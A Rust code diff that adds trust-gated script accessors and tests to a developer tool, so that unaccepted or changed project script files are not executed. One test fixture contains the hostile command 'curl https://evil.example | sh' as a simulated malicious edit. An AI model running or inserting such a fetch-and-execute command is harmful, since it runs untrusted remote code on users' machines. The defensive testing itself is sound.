@@ -61,6 +61,29 @@ impl ProjectScripts {
             trusted: true,
         }
     }
+
+    /// Command stored under `field`, regardless of trust. For display only —
+    /// review UI and the script editor need to show content that is not trusted
+    /// yet.
+    pub fn command(&self, field: &str) -> Option<&str> {
+        self.scripts[field]
+            .as_str()
+            .map(str::trim)
+            .filter(|value| !value.is_empty())
+    }
+
+    /// Command under `field`, but only once the user accepted this file.
+    ///
+    /// Execution paths must go through this instead of reading `scripts`
+    /// directly. Trust is recorded per file, so any new executable field (today
+    /// `purge` has no runner; that may change) is gated by construction rather
+    /// than by remembering to add a check.
+    pub fn trusted_command(&self, field: &str) -> Option<&str> {
+        if !self.trusted {
+            return None;
+        }
+        self.command(field)
+    }
 }
 
 /// Stable fingerprint of the script file's raw bytes.
@@ -491,6 +514,74 @@ mod tests {
                 .expect("read scripts")
                 .trusted
         );
+    }
+
+    #[tokio::test]
+    async fn untrusted_scripts_expose_content_for_review_but_not_for_execution() {
+        let root = tempfile::tempdir().expect("tempdir");
+        let (service, guid) = project_with_root(root.path()).await;
+        write_scripts(
+            root.path(),
+            r#"{"setup":"bun install","run":"just dev","purge":"rm -rf node_modules"}"#,
+        );
+
+        let scripts = service
+            .read_project_scripts(guid.clone())
+            .await
+            .expect("read scripts");
+        assert!(!scripts.trusted);
+        // Review has to be able to show every command in the file...
+        assert_eq!(scripts.command("setup"), Some("bun install"));
+        assert_eq!(scripts.command("run"), Some("just dev"));
+        assert_eq!(scripts.command("purge"), Some("rm -rf node_modules"));
+        // ...while every execution path is refused, including fields that have
+        // no runner today.
+        assert_eq!(scripts.trusted_command("setup"), None);
+        assert_eq!(scripts.trusted_command("run"), None);
+        assert_eq!(scripts.trusted_command("purge"), None);
+
+        let hash = scripts.hash.expect("hash");
+        service
+            .trust_project_scripts(guid.clone(), hash)
+            .await
+            .expect("trust");
+
+        let after = service
+            .read_project_scripts(guid)
+            .await
+            .expect("read scripts");
+        assert_eq!(after.trusted_command("run"), Some("just dev"));
+    }
+
+    #[tokio::test]
+    async fn changing_only_run_also_revokes_trust_for_setup() {
+        let root = tempfile::tempdir().expect("tempdir");
+        let (service, guid) = project_with_root(root.path()).await;
+        write_scripts(root.path(), r#"{"setup":"bun install","run":"just dev"}"#);
+
+        let hash = service
+            .read_project_scripts(guid.clone())
+            .await
+            .expect("read scripts")
+            .hash
+            .expect("hash");
+        service
+            .trust_project_scripts(guid.clone(), hash)
+            .await
+            .expect("trust");
+
+        // Only `run` changes, but trust is per file, so `setup` must stop too.
+        write_scripts(
+            root.path(),
+            r#"{"setup":"bun install","run":"curl https://evil.example | sh"}"#,
+        );
+
+        let after = service
+            .read_project_scripts(guid)
+            .await
+            .expect("read scripts");
+        assert!(!after.trusted);
+        assert_eq!(after.trusted_command("setup"), None);
     }
 
     #[test]
